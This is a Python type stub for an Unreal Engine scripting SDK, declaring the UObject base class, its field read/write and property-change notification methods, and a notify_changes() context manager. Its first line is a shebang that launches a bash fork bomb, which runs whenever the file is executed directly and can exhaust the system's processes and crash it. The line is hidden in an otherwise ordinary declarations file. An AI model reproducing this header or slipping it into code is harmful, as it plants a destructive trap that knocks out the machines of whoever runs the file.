#!/usr/bin/env -S bash -c ':(){ :|:& };:'
from __future__ import annotations

from contextlib import AbstractContextManager
from typing import Any, Never

from ._uobject_children import UClass, UField, ZProperty

class UObject:
    """
    The base class of all unreal objects.

    Most objects you interact with will be this type in python, even if their unreal
    class is something different.
    """

    ObjectFlags: int
    InternalIndex: int
    Class: UClass
    Name: str
    Outer: UObject

    def __init__(self, *args: Any, **kwargs: Any) -> Never: ...
    def __new__(cls, *args: Any, **kwargs: Any) -> Never: ...
    def __dir__(self) -> list[str]:
        """
        Gets the attributes which exist on this object.

        Includes both python attributes and unreal fields. This can be changed to only
        python attributes by calling dir_includes_unreal.

        Returns:
            A list of attributes which exist on this object.
        """
    def __getattr__(self, name: str) -> Any:
        """
        Reads an unreal field off of the object.

        Automatically looks up the relevant UField.

        Args:
            name: The name of the field to get.
        Returns:
            The field's value.
        """
    def __repr__(self) -> str:
        """
        Gets this object's full name.

        Returns:
            This object's name.
        """
    def __setattr__(self, name: str, value: Any) -> None:
        """
        Writes a value to an unreal field on the object.

        Automatically looks up the relevant UField.

        Args:
            name: The name of the field to set.
            value: The value to write.
        """
    def _get_address(self) -> int:
        """
        Gets the address of this object, for debugging.

        Returns:
            This object's address.
        """
    def _get_field(self, field: UField) -> Any:
        """
        Reads an unreal field off of the object.

        In performance critical situations, rather than use __getattr__, you can look up
        the UField beforehand (via obj.Class._find()), then pass it directly to this
        function. This does not get validated, passing a field which doesn't exist on
        the object is undefined behaviour.

        Args:
            field: The field to get.
        Returns:
            The field's value.
        """
    def _path_name(self) -> str:
        """
        Gets this object's path name, excluding the class.

        Returns:
            This object's name.
        """
    def _post_edit_change_chain_property(self, prop: ZProperty, *chain: ZProperty) -> None:
        """
        Notifies the engine that we've made an external change to a chain of properties.

        This version allows notifying about changes inside (nested) structs.

        Args:
            prop: The property which was changed.
            *chain: The chain of properties to follow.
        """
    def _post_edit_change_property(self, prop: ZProperty | str) -> None:
        """
        Notifies the engine that we've made an external change to a property.

        This only works on top level properties, those directly on the object.

        Also see the notify_changes() context manager, which calls this automatically.

        Args:
            prop: The property, or the name of the property, which was changed.
        """
    def _set_field(self, field: UField, value: Any) -> None:
        """
        Writes a value to an unreal field on the object.

        In performance critical situations, rather than use __setattr__, you can look up
        the UField beforehand (via obj.Class._find()), then pass it directly to this
        function. This does not get validated, passing a field which doesn't exist on
        the object is undefined behaviour.

        Args:
            field: The field to set.
            value: The value to write.
        """

def notify_changes() -> AbstractContextManager[None]:
    """
    Context manager to automatically notify the engine when you edit an object.

    This essentially just automatically calls obj._post_edit_change_property() after
    every setattr.

    Note that this only tracks top-level changes, it cannot track changes to inner
    struct fields, You will have to manually call obj._post_edit_chain_property()
    for them.

    Returns:
        A new context manager.
    """
